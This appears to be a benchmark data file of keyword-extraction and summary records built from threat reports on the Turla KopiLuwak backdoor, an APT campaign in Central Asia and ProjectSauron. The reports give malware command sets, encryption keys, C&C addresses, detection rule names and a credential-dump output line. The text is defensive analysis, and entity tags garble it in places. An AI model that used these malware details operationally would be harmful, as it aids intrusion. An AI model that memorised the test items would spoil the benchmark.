[PERSON] Kaspersky , which was possibly added as a result of their public analysis of this backdoor . The output from the commands are saved to the following location : \u201c % appdata%\\Microsoft\\Protect\\~~.tmp\u201dappidpolicyconverter.js [PERSON] AnalysisThe appidpolicyconverter.js script contains a large string that is \ufb01rst base64 - decoded then RC4- decrypted using the supplied parameter as a key ( \u201c gwVAj83JsiqTz5fG \u201d ) from the executed task . Once the [ORG] KopiLuwak backdoor code is successfully decrypted , it is then executed with eval().The decrypted code functions similarly to the original [ORG] KopiLuwak discussed by [PERSON] Kaspersky with some slight changes . The backdoor still communicates with what appear to be [CARDINAL] two compromised , legitimate websites using [ORG] HTTP [ORG] POST requests ( [ORG] Fig . 6).Figure [CARDINAL] 6 : Hardcoded legitimate , compromised command and control serversDiffering from the older sample , [ORG] the [ORG] HTTP User - Agent is now hardcoded and no longer contains a component unique to each infected machine . Each [ORG] HTTP [ORG] POST request sent to the command and control ( [ORG] C&C ) will contain information in its client body . The plaintext content is \ufb01rst preceded with a hardcoded key \u201c Prc1MHxF_VB0ht7S \u201d . Next , the key is followed by a separator string \u201c ridid \u201d . Next , the hardcoded key \u201c Prc1MHxF_VB0ht7S \u201d is used to encode the infected system \u2019s OS installation date ( [ORG] Fig . 7).Figure [CARDINAL] 7 : Retrieving the OS installation dateIf any additional information is being sent to the [ORG] C&C it will then be appended after the encoded installation date . Finally , the data is encrypted with RC4 using a hardcoded key : responses from the [ORG] C&C are decrypted , they are compared to a list of supported commands . This newer variant of [ORG] KopiLuwak has several different supported command keywords , including [CARDINAL] one additional command , giving a total of \ufb01ve commands versus the old variant \u2019s [CARDINAL] four ( [LAW] Table [LAW] 1).Command [LAW] Send the content infected system \u2019s \ufb01ngerprint info stored in ~~.tmp and exit Ex\ufb01ltrate content from provided \ufb01lename ( from C2 ) to C2 . [PERSON] Max ex\ufb01ltrated \ufb01le size is < = [DATE] 1048576 bytes ( 1 MB ) [CARDINAL] Two options for this command : -execute provided [ORG] JS using eval , send contents of ~~.tmp to [CARDINAL] C2 , delete ~~.tmp -save provided content to a \ufb01le in % Appdata%\\Microsoft\\Protect\\a3q4d.[ext ] , execute the \ufb01le , sleep for a random amount of time , delete the \ufb01le , send the contents of ~~.tmp to [CARDINAL] C2 , and delete ~~.tmp Exit the script . The scheduled task would execute the backdoor again in ~10 minutes Saves the provided content with provided extension to % Appdata%\\Microsoft\\Protect\\D8chd.[ext ] . If successful sends success message to C2.Table 1 : [ORG] KopiLuwak supported commands and descriptionsThe newer variant of [ORG] KopiLuwak is now capable of ex\ufb01ltrating \ufb01les to the [ORG] C&C as well as downloading \ufb01les and saving them to the infected machine . Although these capabilities could have been accomplished in the previous variant by executing arbitrary commands , they are now implemented with their own dedicated commands . Despite the added capabilities , we still agree with [PERSON] Kaspersky that this backdoor is likely used as an initial reconnaissance tool and would probably be used as a staging point to deploy [CARDINAL] one of [GPE] Turla \u2019s more fully featured implants . We also believe this backdoor will continue to be used in the future as suggested by the continued development of the backdoor itself as well as the new delivery mechanisms . ConclusionBecause the samples were obtained from a public malware repository and we have not yet observed them in the wild , the full scope and impact of the attack ( or , possibly , a pending attack ) can not be fully assessed . However , for PCs running the .NET framework ( which includes most modern Windows operating systems ) , the potential impact is high:\u2022\u2022The JavaScript dropper pro\ufb01les the victim \u2019s system , establishes persistence , and installs the [ORG] KopiLuwak backdoor . [ORG] KopiLuwak is a robust tool capable of ex\ufb01ltrating data , downloading additional payloads , and executing arbitrary commands provided by the actor(s)The high pro\ufb01le of potentially targeted individuals associated with the [ORG] G20 and early reconnaissance nature of the tools involved bear further watching . We have noti\ufb01ed CERT - Bund of this activity . We will continue to track the activities associated both with this actor and these new tools and update this blog as details emerge . References[1 ] url url url url url\ufb01reeye.com/rs/848-DID-242/images/rpt-witchcoven.pdf[6 ] url bug - attack - group.pdf[7 ] url backdoor/[8 ] url\ufb01refox- extension - abusing - instagram/[9 ] url identi\ufb01ed[10 ] url url of [PERSON] Compromise ( IOCs ) php52 / lib / xrstf / Composer52 / LogsLoader.phpET and [ORG] ETPRO Suricata / Snort Coverage2827574,ETPRO TROJAN Turla JS / KopiLuwak CnC Beacon M12827575,ETPRO TROJAN Turla JS / KopiLuwak [PERSON] CnC [PERSON] Beacon M2Most recent2 WEEKS AGO Smominru [PERSON] Monero mining botnet making [CARDINAL] millions for operators\ue9083 WEEKS AGO Double dipping : Diverting ransomware [PERSON] Bitcoin payments via .onion domains1 MONTH AGO Proofpoint Q4 2017 Threat Report : Coin miners and ransomware are front and center1 MONTH AGO Holiday lull ? Not so much2 MONTHS AGO [GPE] North [GPE] Korea Bitten by [PERSON] Bitcoin [PERSON] Bug : Financially motivated campaigns reveal new dimension of the Lazarus GroupRelated Links Ransomware Survival Guide \uf105 Threat Insight Blog \uf105 Events \uf105 [ORG] Media [ORG] Contacts \uf105Company [ORG] InformationAbout [ORG] Proofpoint [ORG] Board of Directors News Center\uf105\uf105\uf105\uf105\uf105\uf105\uf105Quick linksDaily [ORG] Ruleset Summary\uf105IP Address Blocked ? Threat Insight ( blog ) Upgrade from McAfee\uf105\uf105\uf105Connect\ue910See all contactsRegionsUnited [GPE] StatesUnited [GPE] Kingdom FranceGermanySpainJapanAustralia \u00a9 [DATE] 2018 . All rights reserved . Privacy Policy .", "generated_text": "a Russian; APT; Turla; JS/KopiLuwak; use; G20 Task Force meetings; the Digital Economy; the decoy; a JavaScript backdoor; The JavaScript dropper; Runer.exe; a malware repository; Proofpoint researchers; the malware; techniques; LSEC; domain; a name; a.NET/MSI dropper; the malware; a JavaScript backdoor; memory; training; the backdoor; variants; detection; documents; malware samples; targeted targets; the group; activities; The group; targets; individuals; journalists; journalists; policymakers; a legitimate PDF decoy; the decoy; an activity; discovery; targets.", "ref_text": "<START-1>The document analyzes a new variant of the Turla APT group's KopiLuwak JavaScript backdoor being spread via a .NET dropper. The dropper was found on a malware repository and delivered the backdoor along with a G20-themed decoy document. This suggests targets may be involved in the G20 Digital Economy Task Force. The MSIL dropper drops and executes the Stage1 JS dropper and a PDF decoy. The JS dropper sets persistence, fingerprints the system, and installs the JS backdoor decryptor. The backdoor uses RC4 encryption and communicates with two compromised websites. It can exfiltrate data, download files, and execute arbitrary commands from the attacker. Changes from older versions include additional system fingerprinting, hardcoded network communication values, and a new command for downloading files. While the full scope of attacks leveraging this variant is unknown, its continual evolution highlights Turla's capabilities and efforts to refine their tools against high-value diplomatic and government targets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4808362369337979, "gpt3/lexical/rouge_rouge2": 0.11228070175438597, "gpt3/lexical/rouge_rougeL": 0.2229965156794425, "gpt3/lexical/rouge_rougeLsum": 0.2229965156794425, "gpt3_generated_text": ["The article discusses the use of a JavaScript backdoor called JS/KopiLuwak by a well-known Russian-speaking APT actor known as Turla. The backdoor is being delivered through a new.NET/MSIL dropper and is associated with the group's reconnaissance activities. The dropper is being distributed with a benign decoy document inviting recipients to a G20 task force meeting on the \"Digital Economy\". The dropper first appeared in mid-July and suggests that Turla is actively targeting G20 participants and those with an interest in the G20, including member nations, journalists, and policymakers. The delivery method of the backdoor is currently unknown, but it could be through spear phishing or a watering hole attack. The article provides details on the dropper and the infection chain, highlighting the activities of Turla."]}, {"split_name": "val", "sample_id": "val_89", "prompt_text": "Extract the keywords: [CARDINAL] 5/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsAPT [PERSON] Group [PERSON] Planted [PERSON] Backdoors [PERSON] Targeting [PERSON] High [PERSON] Pro\ufb01le [PERSON] Networks in [NORP] Central [NORP] Asiadecoded.avast.io/luigicamastra/apt-group-planted-backdoors-targeting-high-pro\ufb01le-networks-in-central-asiaMay 14 , 2020Last fall , [ORG] APT malware intrusions targeting high - pro\ufb01le companies in [LOC] Central [LOC] Asia caught our attention . [DATE] A [DATE] few [DATE] months [DATE] later , we began working together with fellow malware analysts from ESET to analyze samples used by the group to spy on a telecommunications company , a gas company , and a governmental institution in [LOC] Central [LOC] Asia . An [ORG] APT group , which we believe could possibly be from [GPE] China , planted backdoors to gain long - term access to corporate networks . Based on our analysis , we suspect the group was also behind attacks active in [GPE] Mongolia , [GPE] Russia , and [GPE] Belarus . The group behind the attack frequently recompiled their custom tools to avoid AV detection , which , in addition to the backdoors , included [PERSON] Mimikatz and Gh0st [ORG] RAT . This has led to a large number of samples , with binaries often protected by [ORG] VMProtect , making analysis more dif\ufb01cult . The backdoors gave the actors the ability to manipulate and delete \ufb01les , take screenshots , manipulate processes , and services , as well as execute console commands , remove itself , and more . Further , some commands may have instructed the backdoors to ex\ufb01ltrate data to a [ORG] C&C server . Infected devices could also be commanded by a [ORG] C&C server to act as a proxy or listen on a speci\ufb01c port on every network interface . The group also used tools such as Gh0st [ORG] RAT and Management Instrumentation to move laterally within in\ufb01ltrated networks.url\ufb01le - networks - in - central - asia/1/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsTimelineFigure [CARDINAL] 1 : Timeline of events related to the tracking of [PERSON] Microcin , and [TIME] Avast [TIME] notifying the targeted companyAvast \u2019s and [ORG] Eset \u2019s antivirus engines blocked the samples used by the [ORG] APT group prior to it attracting our attention , as our antivirus engines \u2019 detections are automated . [ORG] Attribution [ORG] & [ORG] Clusterization The samples we analyzed contain links to malware samples and campaigns , such as [ORG] Microcin , [ORG] BYEBY , and [PERSON] Vicious [PERSON] Panda , previously described by [ORG] Kaspersky , [GPE] Palo [GPE] Alto [GPE] Networks , and [ORG] Check [ORG] Point , respectively . The backdoors we found are custom tools that have not previously been analyzed , as far as we know . The majority of the [ORG] C&C servers are registered to [PERSON] Choopa , [ORG] LLC , a hosting platform that has been used by cybercriminals in the past . A [PERSON] GoDaddy registrar was also seen early in the campaign , these servers were removed early on . We suspect the [ORG] APT group behind these attacks is from [GPE] China . Gh0st [ORG] RAT , [CARDINAL] one of the tools used , has been known to be used by [NORP] Chinese [ORG] APT groups in the past . Similarities in the code used in the Vicious Panda campaign , ( TTPS , especially the use of [ORG] the [ORG] RTF [ORG] Weaponizer in the infection vector ) , which is also thought to have come from [GPE] China , and the code we analyzed , also lead us to believe the group might be from [GPE] China . The targeted companies and institutions , as well as the professional coding point to an [ORG] APT group . [ORG] ToolsetBackdoorsurl\ufb01le - networks - in - central - asia/2/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsThroughout our analysis , we stumbled upon the following backdoors . Details on these backdoors [ORG] C&C server 104.194.215[.]194pcaudit.bat1395B863AE5697EA5096F4E2EBEF54FC20D5380B6921F8835D1F030F2BA16A40Technical details ( [GPE] pcaudit.bat ) pcaudit.bat is a batch \ufb01le that is used to invoke the svchost.exe in order to load the [ORG] DLL \ufb01le for a given service speci\ufb01ed in the registry . This batch \ufb01le is responsible for the backdoor \u2019s persistence . The contents of the pcaudit.bat script can be found below : Figure [CARDINAL] 2 : The batch \ufb01le that is responsible for the backdoor \u2019s persistenceTechnical details ( sqllauncher.dll , logon.dll ) Both DLLs , sqllauncher.dll and logon.dll , are primarily used as backdoors . These are installed as services by the aforementioned batch \ufb01le . They both create a log \ufb01le under the path : % COMMON_DOCUMENT%\\WZ9JuN00.tmp aggregating errors during the backdoor \u2019s runtime . Each entry contains an error code , an error message , and a timestamp formatted as \u201c [ yyyy - mm- dd hh - mm - ss ] % error code% % message%\u201d . If the infected device ca n\u2019t connect to the [ORG] C&C server , the malware attempts to determine whether the traf\ufb01c is routed through a proxy . This information may be retrieved either from % WINDOWS%\\debug\\netlogon.cfg or from the [ORG] TCP table . After successfully connecting to theurl\ufb01le - networks - in - central - asia/3/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsC&C server , a secure communication channel ( [ORG] Schannel ) is established and telemetry ( OS version , username ) is sent to the [ORG] C&C server . The following commands are issued by the [ORG] C&C [ORG] WELCOMLIST [ORG] DSTARTCUPLOADDOWNLOEXECUTSend malware version to the C&C Send all used drive let\u2010 ters to the C&C Start remote shell [ORG] Execute \u201c cmd % com\u2010 mand% \u201d via CreatePro\u2010 cess API Read from % path% and send data to [ORG] C&C [ORG] Write [ORG] % data% into via [ORG] CreateProcess [ORG] APICom\u2010 [ORG] % [CARDINAL] command%J8AoctiB QHb\u2010 % command%Technical details ( logsupport.dll ) Similarly to the previous DLLs , the logsupport.dll is primarily used as a backdoor , but uses a different [ORG] C&C server than the other backdoors . Its corresponding log \ufb01le is located at % TEMP%\\rar%[A - Z0 - 9]{4}%.tmp . The structure of the log \ufb01le is also the same . The main difference is that the log \ufb01le is encrypted by a XOR cipher with a hardcoded key.url\ufb01le - networks - in - central - asia/4/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsFigure [CARDINAL] 3 : Log \ufb01le is decrypted by a XOR cipher with a hardcoded keyThis backdoor checks whether the malware is running in a virtualized environment . Additionally , the [ORG] DLL \ufb01ngerprints the infected device ( [ORG] NETBIOS name , [ORG] IP address , username , OS version , [ORG] MAC address and [ORG] RAM usage , OEM code page , token information , number of CPU cores , is64bit ) , and sends this information to the [ORG] C&C server . The communication with the [ORG] C&C server is encrypted by a simple stream cipher . If the malware fails to establish an encrypted channel , it checks whether a proxy is being used , using different methods than the previous [CARDINAL] two DLLs . It tries to connect to url and retrieve information about a possible proxy from the connection , and it also checks the value of ProxyServer in the Windows registry key : HKLM\\Software\\Microsft\\Windows\\CurrentVersion\\Internet Settings . Based on what we saw in the code , the backdoor is also capable of accepting various commands from the [ORG] C&C server . These commands allow the backdoor to manipulate \ufb01les ( move , read , delete , check existence ) , manipulate processes ( create , terminate , retrieve parent , and process ID ) and Windows services ( start , stop , check ) , execute console commands , remove itself , and more . Some of these commands ( read / check \ufb01le , check services , check processes ) also send data back to C&C. The infected device can also be commanded by [ORG] C&C to act as a proxy or listen on a speci\ufb01c port on every network interface . Interestingly , the backdoor has a set of commands speci\ufb01cally targeting \ufb01les with .tu and .tut \ufb01le extension . These commands may similarly check for their existence , send their content back to the [ORG] C&C , and modify their content ( append or rewrite by data given by the [ORG] C&C server ) . started in [DATE] 2007 . It is a robust tool that exploits various Windows authentication schemes and dumps credential - related data from a Windows Local Security Account database . For these reasons it is often misused by a wide spectrum of [ORG] APT actors such as [ORG] the [ORG] Lazarus [ORG] Group or Telebots . The [PERSON] Mimikatz version used in this campaign has a [CARDINAL] two - stage installation mechanism ( installer.exe installing [ORG] Yokel64.exe and [ORG] mktz64.dll ) , and contains a [ORG] PDB string \u201c E:\\2018_\\MimHash\\mimikatz\\Bin\\mktzx64.pdb \u201d . Calling a [NORP] mktz64.dll exported function MktzDumpbyInjection inside our testing virtual machine yields the following output:#1 domain = MSEDGEWIN10 , user = Administrator , nthash = FC525C9683E8FE067095BA2DDC971889 # 2 domain = MSEDGEWIN10 , user = [ORG] IEUser , uses the following format : \u201c @@<ComputerName>,<UserName>,<Password>,.exe \u201d . Afterwards , the data described in the \ufb01lename is extracted and used to establish a remote console to a computer identi\ufb01ed by the retrieved name . Afterwards , Windows Management Instrumentation ( WMI ) is leveraged to set a strict proxy security , leading to the encryption of arguments of each remote procedure call , and allowing the server to access local resources . Then [ORG] WMI is used again to retrieve the Win32_Process class which in turn is used to create a process with given parameters . At the end , it terminates itself . Gh0st [ORG] RAT is commonly assumed that its source code is widely available . Its presence is often indicated by a \ufb01le named rastls.dll , using an export [ORG] DLL name svchost.dll and containing a string Gh0st . A string uwqixgze } is used as a placeholder for the [ORG] C&C domain . The version we \u2019ve seen in this campaign tries to connect to url\ufb01le - networks - in - central - asia/6/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsFigure [CARDINAL] 4 : Gh0st RAT malwareCode Similarities While analyzing one of the \ufb01les , we noticed that it has several correlations to the [PERSON] Microcin sample from [DATE] 2017 , the [ORG] BYEBY sample from [DATE] 2017 , and [PERSON] Vicious [PERSON] Panda : The COVID campaign from [DATE] 2020 . Figure [CARDINAL] 5 below provides a comparison of the decryption loop used to decrypt the main con\ufb01guration data of the \ufb01rst backdoor . Figure [CARDINAL] 5 : Part of code used to decipher the main con\ufb01guration dataurl\ufb01le - networks - in - central - asia/7/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast [LOC] Threat LabsSHA256Name of \ufb01le irmon.dll [DATE] 170008187EBCEF183E792513608B82572FAF0AAEB33212BFA44736439453218F Avast reported its \ufb01ndings to the local [ORG] CERT team and reached out to the telecommunications company . We have not heard back from either organization . Avast has recently protected users in [LOC] Central [LOC] Asia from further attacks using the samples we analyzed . This , along with tying elements of the samples we discovered back to attacks carried out on other countries , makes me assume the group is still active . I would like to thank [PERSON] Peter [PERSON] Kalnai from ESET for working with me on the analysis , [PERSON] Luk\u00e1\u0161 [PERSON] Obrdl\u00edk , and [ORG] Adolf [ORG] St\u0159eda from Avast for helping me with this research , as well as [PERSON] Alexey [PERSON] Shulmin from [PERSON] Kaspersky for his support . Indicators of Compromise ( IoC)Repository : url [WORK_OF_ART] List [WORK_OF_ART] of [WORK_OF_ART] SHA-256 : url Vasily Berdnikov , [PERSON] Dmitry [PERSON] Karasovsky , [PERSON] Alexey [PERSON] Shulmin : \u201c Microcin malware \u201d , [PERSON] Kaspersky [PERSON] Labs 2017- [CARDINAL] 9 - 25 url content / uploads / [WORK_OF_ART] sites/43/2018/03/07170759 / Microcin_Technical_4PDF_eng_\ufb01nal_s.pdfJosh Grunzweig , [PERSON] Robert [PERSON] Falcone : \u201c Threat Actors Target Government of Belarus Using CMSTAR Trojan \u201d , [GPE] Palo [GPE] Alto [GPE] Networks , [DATE] September [DATE] 2017 , url actors - target - government - belarus - using - cmstar - trojan / Checkpoint Research : \u201c [WORK_OF_ART] Vicious [WORK_OF_ART] Panda : [WORK_OF_ART] The [WORK_OF_ART] COVID [WORK_OF_ART] Campaign \u201d , [DATE] 2020 [DATE] - 03 [DATE] - 12 url [ORG] Threat [ORG] Intelligence url\ufb01le - networks - in - central - asia/8/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in [LOC] Central [LOC] Asia [LOC] - [LOC] Avast Threat LabsESET Threat Intelligence url Mahjoub , Jeremiah O\u2019Connor , [ORG] Thibault [ORG] Reuille , [PERSON] Thomas [PERSON] Mathew : \u201c Phishing , Spiking , [WORK_OF_ART] and [WORK_OF_ART] Bad Hosting \u201d , Cisco Umbrella Blog , 2015 [DATE] - 09 [DATE] - 14url\ufb01le - networks - in - central - asia/9/9", "generated_text": "Avast Threat Labs; analysis; the APT Group; late 2019; high-profile companies; Central Asia; the group; backdoors; access; organizations; custom tools; AV detection; Mimikatz; Gh0st RAT; a large number; samples; binaries; VMProtect; analysis; a large number; samples; binaries; VMProtect; The backdoors; control; processes; services; command execution; process; control; command execution; servers; Choopa; GoDaddy; detection; similarities; Vicious Panda; the code; TTPS; the RTF Weaponizer; the Vicious Panda campaign; the malware; sabotage; fact; the researchers; the tools; the report; China.", "ref_text": "<START-1>The document describes an advanced persistent threat (APT) campaign targeting high-profile companies in Central Asia that was analyzed by Avast and ESET. The attackers planted backdoors to gain long-term access to corporate networks. The threat actors frequently recompiled their custom malware tools to avoid detection. The tools included backdoors, Mimikatz, and Gh0st RAT. Many samples were protected by VMProtect obfuscation. The backdoors gave the attackers capabilities to manipulate files, take screenshots, manipulate processes and services, execute commands, proxy network traffic, exfiltrate data, and more. Lateral movement within compromised networks was achieved using Mimikatz credential theft and Windows Management Instrumentation (WMI). Attribution points to an APT group possibly from China, based on code similarities with past campaigns like Vicious Panda, the use of Gh0st RAT, and the professional coding techniques. Most command and control servers were registered with Choopa LLC hosting. Avast and ESET detected and blocked the malware before this campaign was fully analyzed. The threat actors are suspected to still be active, as similar attacks were seen targeting Central Asia recently. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.588957055214724, "gpt3/lexical/rouge_rouge2": 0.24074074074074073, "gpt3/lexical/rouge_rougeL": 0.3680981595092025, "gpt3/lexical/rouge_rougeLsum": 0.3680981595092025, "gpt3_generated_text": ["In late 2019, Avast Threat Labs discovered that an APT group had planted backdoors in high-profile companies in Central Asia. Working with ESET, they analyzed samples used by the group and found that the backdoors were used to gain long-term access to corporate networks. The group, suspected to be from China, also targeted organizations in Mongolia, Russia, and Belarus. The group frequently recompiled their custom tools to avoid antivirus detection and used tools like Mimikatz and Gh0st RAT. The backdoors allowed the actors to manipulate files, take screenshots, execute commands, and exfiltrate data to a C&C server. The group used C&C servers registered to Choopa, LLC, and a GoDaddy registrar was also used early in the campaign. The similarities in code and tactics used by the group led the researchers to believe that they are from China. The targeted companies and professional coding point to an APT group."]}, {"split_name": "val", "sample_id": "val_90", "prompt_text": "Extract the keywords: THE PROJECTSAURON APT . the name \u2018 RPCHlpr \u2019 and only continues to run in case when the process token contains a \u201c S-1 [WORK_OF_ART] - [WORK_OF_ART] 5 [WORK_OF_ART] - 6 \u201d ( Service ) sid . The module spawns [CARDINAL] one thread , creates a named pipe \u201c \\\\.\\pipe\\rpchlp_0 \u201d , and waits for connections to that pipe . Once a connection occurs , it creates another thread to carry out communication . Then it receives a 8- byte rc4 key and body of a command to run . Next it creates [CARDINAL] three pipes , \u201c \\\\.\\pipe\\rpchlp_1 \u201d , \u201c \\\\.\\pipe\\rpchlp_2 \u201d and \u201c \\\\.\\pipe\\rpchlp_3 \u201d for standard file handles ( stdin , stdout , stderr ) and waits for all these pipes to connect . Depending on the command received , it may either execute the shellcode or start a process with the given command line and redirects RC4 - encrypted input / output from all the handles from / to the sender . Standard blobThe shellcode blob is expected to start with a magic value \u201c 0xC102AA02 \u201d ( DWORD ) . The blob format is the [CARDINAL] 00 DWORD magic \u201c 0xC102AA02 \u201d [CARDINAL] 04 [ORG] BYTE version [CARDINAL] 2 [CARDINAL] 05 [ORG] BYTE version minor \u2013 any [CARDINAL] 06 DWORD offset of entrypoint [CARDINAL] 0A DWORD blob size Executable blobs of the described format are used in many components of the malicious platform and are referred in the description as \u201c standard [PERSON] blobs\u201d . Passive sniffer backdoorFormat : [ORG] PE DLL 32/64 bit [PERSON] File sizes : [CARDINAL] 75 \u2013 [CARDINAL] 91 [ORG] KbFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 2 of 33The ProjectSauron APT . Technical analysisCompilation timestamps , linker versions : multiple variant , but match those of the target OS files ( usually \u201c svchost.exe\u201d).The module is known to be installed as either an [ORG] LSA password manager library , or as a Security Provider . The business logics is provided by [CARDINAL] one of the exported functions and is triggered when the corresponding system layer loads the library . When invoked , the module decrypts the [ORDINAL] first layer from the blob that contains actual code . The blob happens to have the same format as the [ORG] RPC [ORG] Helper payload . Once the magic value and code boundaries are verified , the code invokes the shellcode from the blob . The shellcode removes subsequent layers of encryption and decompresses its payload using the Jcalg1 algorithm . The payload contains another layer of shellcode that loads , relocates and invokes the [ORG] PE binary inside . The configuration consists of [CARDINAL] 1 [CARDINAL] - [CARDINAL] 3 [ORG] DLL files , the [ORDINAL] first one being the main module and [CARDINAL] 1 - 2 others are optional plugins . The main module starts by enumerating all available plugins and starting them by calling the function exported by the name \u201c ainit \u201d . Every plugin provides a pointer to its own function table to the calling core . The configuration provided by the \u201c upper \u201d layer of the shellcode also contains the names of the event and mutex objects that are created by the core \u2013 these are usually unique for each sample . Then , it locates its configuration data in the resource called \u201c CONFIG \u201d of type \u201c [PERSON] RT_CONFIG \u201d . The resource is encrypted using AES - CBC with a hardcoded key \u201c EFEB0A9C6ABA4CF5958F41DB6A31929776C643DEDC65CC9B67AB8B0066FF2492\u201d . The key is not encrypted and can be located in the memory of the target processes while the module is running . The configuration is in readable text format . It is separated into sections that refer to different plugins by headers starting with ' : ' . Every option contains a prefix that specifies its format \u2013 S ( string ) , B ( boolean ) , ' I ' , ' D ' , ' N ' ( integer ) , ' E ' ( list):Core [ S]Public [ORG] Key=\"ul35zkT / MGP3poQe+enL0dZef5rkaQtaZ78rn2qCsJjB45TCsSG26Qhz9lTtucKGpAqxmB5ByUOMsENKQL1twZm8zuxxfOIViGnj a0Yr49v8SlS9vCD / wibjo/0ri4c9JH80h5z3EWfXKIAmdgKRuCQXgiORBz4TFx1C+MRt0bzOYsM+kzuRsvUhmKPkL6iVAwpic1LGMH5S kMeWmtHbWYpOL+3U70YeHgFCKjWuhy9Nmt36EWZLKzZitjvYFq8EJ3QfpoMB+oWa9OhOlde2 + 9zOeTYPwGUq9t / oQwlXXTnfA7 HkSVcvuoo+E//gzPJ / wT6Xq82IlsqB / IznIeaZaQ== \" [ S]Process List=\"svchost.exe:*netsvc*,spoolsv.exe :* \" [ [WORK_OF_ART] B]Monitor [WORK_OF_ART] Child [WORK_OF_ART] Thread = false [ B]Disable Master Execute = false : Raw [ B]Any Dest = false : Icmp the module creates a socket and starts a new thread to monitor routing and [ORG] IP changes . Finally , it starts every plugin , providing pointer to own function table . For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 3 of 33The ProjectSauron APT . Technical analysisOnce a network packet is received by a plugin , it pushes the packet to the core and tries to decrypt the packet header with RC5 using the public key . If the [ORDINAL] first dword matches [PRODUCT] 0x11111111 , it decrypts the rest of the packet , verifies the CRC32 and appends it to the queue . The packet is expected to be a command , either providing the core plugin with the address of the [ORG] C&C server to connect to , the local port number to listen to , or the path to the additional local module to load and start . Depending on the command received in a packet , the module can : Execute an arbitrary binary from diskLoad and start an encrypted plugin from diskSpawn a network connection objectThe plugin on disk is encrypted with RC6 with a [CARDINAL] 64 - bit key that is provided by the [ORG] C&C server . The decrypted and decompressed blob is expected either to be a valid [ORG] PE file or a standard blob . Plugin : \u201c Raw\u201dMD5 : many , irrelevant [PERSON] Size : [CARDINAL] 25 Kb Format : PE32/64 [ORG] DLL The packet handler processes [ORG] IP packets of protocols : ICMP , [ORG] IGMP , [ORG] UDP , TCP.The plugin extracts the contents from the incoming packets according to the corresponding protocol specification . For [PERSON] ICMP packets , it only passes those of type [CARDINAL] 8 ( echo request ) . No additional checks are performed and since the payload is encrypted with an arbitrary key using RC5 it can be only filtered out by high entropy values in the payload . Plugin : \u201c Icmp\u201dMD5 : many , irrelevant [PERSON] Size : [CARDINAL] 11 Kb [PERSON] Format : PE32/64 [ORG] DLL The plugin processes incoming [ORG] ICMP packets using a raw socket object . The module verifies that the packet type is either [CARDINAL] 0 ( echo reply ) or [CARDINAL] 8 ( echo request ) . If the [ORG] ICMP type matches , it skips the [ORG] ICMP header and passes the rest of the packet to the core . Plugin : \u201c [PERSON] Pcap\u201dMD5 : many , irrelevant [PERSON] Size : [CARDINAL] 24 Kb [PERSON] Format : PE32/64 DLLFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 4 of 33The ProjectSauron APT . Technical analysisThe plugin tries to open the \\Device\\NdisRaw device . If failed , it enumerates all loaded drivers using undocumented parameter [CARDINAL] 11 of NtQuerySystemInformation and checks if \u201c nps.sys \u201d ( network packet filter ) is loaded . After this , it resolves the API of \u201c packet.dll \u201d . Another mode of operation is to start the \u201c NPF \u201d service and work via [PERSON] NdisRaw device . In that case it provides wrappers to emulate the API of \u201c packet.dll\u201d . The plugin expects to receive [CARDINAL] IPv4 packets of [CARDINAL] no [CARDINAL] more [CARDINAL] than [CARDINAL] 1514 bytes . The only difference from \u201c Raw \u201d in further processing is that it supports only ICMP echo request , [ORG] UDP and [ORG] TCP packets . There are monolithic versions of the passive backdoor that contain all the \u201c plugins \u201d inside the main binary the [ORG] UDP header . All such packets are accepted , decrypted and validated for the magic value . It uses the same API as the \u201c pcap \u201d plugin . The \u201c [PERSON] PcapTcp \u201d is similar , it waits for incoming TCP packets and inspects data that follows the [ORG] TCP header . The packet is expected to be of size between 0x76 and 0x1A5 bytes and should not be a broadcast packet . Plugin : \u201c Dns\u201dThis plugin acts according to a predefined schedule . [ORG] The \u201c [ORG] Poll [ORG] Times \u201d parameter specifies the specific time when the plugin should try connect to its [ORG] C&C server . [PERSON] Format : \u201c day_of_month / hour : minute , \u201d . There can be up to [CARDINAL] 31 such entries . If current time matches one from [ORG] the \u201c [ORG] Poll [ORG] Times \u201d list or \u201c [WORK_OF_ART] Poll [WORK_OF_ART] on [WORK_OF_ART] Start \u201d was set to \u201c true\u201d . [ORDINAL] First it resolves the hostname specified by the \u201c Start Marker \u201d value . Then it only continues if the name was resolved and the returned [ORG] IP address is equal to the [CARDINAL] one specified in the \u201c Start Marker \u201d [ORDINAL] second part . It forms the full [ORG] DNS name to resolve by replacing the \u201c % d \u201d mark in the \u201c Address Format \u201d with \u201c [CARDINAL] 1 \u201d and then \u201c [CARDINAL] 2 \u201d etc until the total packet size is less than 0x11B bytes . The sum of received data is expected to be eq or [CARDINAL] more [CARDINAL] than [CARDINAL] 0x40 bytes . Plugin : \u201c Pipe\u201dThe plugin looks for the option \u201c Pipe Name \u201d in the [ORG] Core configuration , which is used as \u201c \\\\.\\pipe\\%value% \u201d for creating a pipe object . Then it waits for incoming connections to the named pipe , reads packets of size [CARDINAL] 287 bytes and processes them as any other packet obtained by plugins . For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 5 of [CARDINAL] 33The ProjectSauron APT . Technical analysisPlugin : \u201c Http\u201dThis plugin acts according to a predefined schedule . [ORG] The \u201c [ORG] Poll [ORG] Times \u201d parameter specifies the specific time when the plugin should try to connect to its 